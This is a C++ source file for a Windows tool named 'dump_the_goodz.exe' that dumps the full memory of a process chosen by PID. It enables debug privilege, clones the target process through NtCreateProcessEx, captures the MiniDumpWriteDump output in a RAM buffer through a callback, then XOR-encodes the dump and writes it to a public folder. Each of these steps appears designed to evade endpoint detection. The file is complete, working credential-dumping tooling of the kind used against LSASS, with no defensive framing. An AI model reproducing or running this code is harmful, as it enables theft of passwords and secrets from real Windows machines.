#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <DbgHelp.h>
#include <vector>
#include <string>
#include <thread> 
#include <atomic> 
#include <cstdlib> 

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Dbghelp.lib")

// --- Globals & Constants ---
#define PS_INHERIT_HANDLES 0x00000004
const char XOR_KEY = 0x55;

std::atomic<DWORD> dumpSize(0);
LPVOID dumpBuffer = NULL;

typedef NTSTATUS(NTAPI* NtCreateProcessEx_t)(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL,
    IN ULONG JobMemberLevel
    );

BOOL EnablePrivilege(LPCWSTR privilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;

    if (!LookupPrivilegeValue(NULL, privilege, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;

    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL result = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

    if (!result || GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

void xor_buffer(LPVOID buffer, DWORD size, char key) {
    BYTE* p = (BYTE*)buffer;
    for (DWORD i = 0; i < size; i++) {
        p[i] ^= key;
    }
}

// --- Worker Thread Function ---
void process_and_save_dump(LPVOID buffer, DWORD size, const char* outPath) {
    std::cout << "[*] Worker thread started: Encrypting " << size << " bytes..." << std::endl;

    xor_buffer(buffer, size, XOR_KEY);

    std::cout << "[*] Worker thread: Encryption complete. Writing to disk..." << std::endl;

    HANDLE hFile = CreateFileA(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Worker thread: Failed to create file. Error: " << GetLastError() << std::endl;
        return;
    }

    DWORD bytesWritten = 0;
    if (WriteFile(hFile, buffer, size, &bytesWritten, NULL)) {
        std::cout << "[!!!] Success! XORed dump saved to " << outPath
            << " (" << bytesWritten << " bytes written)." << std::endl;
    }
    else {
        std::cerr << "[-] Worker thread: Write failed. Error: " << GetLastError() << std::endl;
    }

    CloseHandle(hFile);
    std::cout << "[*] Worker thread: Task finished." << std::endl;
}

// --- Callback Routine ---
BOOL CALLBACK DumpCallbackRoutine(PVOID CallbackParam, const PMINIDUMP_CALLBACK_INPUT CallbackInput, PMINIDUMP_CALLBACK_OUTPUT CallbackOutput) {
    LPVOID destination = 0;
    LPVOID source = 0;
    DWORD bufferSize = 0;

    switch (CallbackInput->CallbackType) {
    case IoStartCallback:
        CallbackOutput->Status = S_FALSE;
        break;

    case IoWriteAllCallback:
        source = CallbackInput->Io.Buffer;
        destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)CallbackInput->Io.Offset);
        bufferSize = CallbackInput->Io.BufferBytes;

        RtlCopyMemory(destination, source, bufferSize);
        dumpSize.fetch_add(bufferSize);

        CallbackOutput->Status = S_OK;
        break;

    case IoFinishCallback:
        CallbackOutput->Status = S_OK;
        break;

    default:
        return TRUE;
    }
    return TRUE;
}

// --- Main Execution ---
int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "Usage: dump_the_goodz.exe <PID>" << std::endl;
        return 1;
    }

    DWORD targetPid = (DWORD)atoi(argv[1]);

    if (targetPid == 0) {
        std::cerr << "[-] Invalid PID provided." << std::endl;
        return 1;
    }

    if (!EnablePrivilege(SE_DEBUG_NAME)) {
        std::cerr << "[-] Privilege escalation failed." << std::endl;
        return 1;
    }

    // 1. Setup the Heap Buffer (200MB)
    dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 200);
    if (!dumpBuffer) {
        std::cerr << "[-] Failed to allocate buffer." << std::endl;
        return 1;
    }

    dumpSize.store(0);

    // 2. Clone PID via NtCreateProcessEx
    HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
    NtCreateProcessEx_t NtCreateProcessEx = (NtCreateProcessEx_t)GetProcAddress(hNtDll, "NtCreateProcessEx");

    HANDLE hTarget = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
    if (!hTarget) {
        std::cerr << "[-] Failed to open target process (Error: " << GetLastError() << ")." << std::endl;
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }

    HANDLE hClone = NULL;
    NTSTATUS status = NtCreateProcessEx(&hClone, PROCESS_ALL_ACCESS, NULL, hTarget, PS_INHERIT_HANDLES, NULL, NULL, NULL, 0);
    if (status != 0) {
        std::cerr << "[-] NtCreateProcessEx failed. Status: " << status << std::endl;
        CloseHandle(hTarget);
        HeapFree(GetProcessHeap(), 0, dumpBuffer);
        return 1;
    }

    // 3. Create the "Bait" handle to NUL
    HANDLE hNul = CreateFileA("NUL", GENERIC_ALL, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // 4. Trigger the Dump
    MINIDUMP_CALLBACK_INFORMATION mci;
    mci.CallbackRoutine = DumpCallbackRoutine;
    mci.CallbackParam = NULL;

    std::cout << "[*] Siphoning PID " << targetPid << " to RAM buffer..." << std::endl;

    BOOL dumped = MiniDumpWriteDump(hClone, targetPid, hNul, MiniDumpWithFullMemory, NULL, NULL, &mci);

    if (dumped) {
        DWORD finalSize = dumpSize.load();
        std::cout << "[+] Captured " << finalSize << " bytes. Spawning worker thread to XOR and save..." << std::endl;

        const char* outPath = "C:\\Users\\Public\\PID_xor.dmp";

        std::thread worker(process_and_save_dump, dumpBuffer, finalSize, outPath);
        worker.join();
    }
    else {
        std::cerr << "[-] Dump failed. Error: " << GetLastError() << std::endl;
    }

    CloseHandle(hNul);
    CloseHandle(hClone);
    CloseHandle(hTarget);
    HeapFree(GetProcessHeap(), 0, dumpBuffer);

    return 0;
}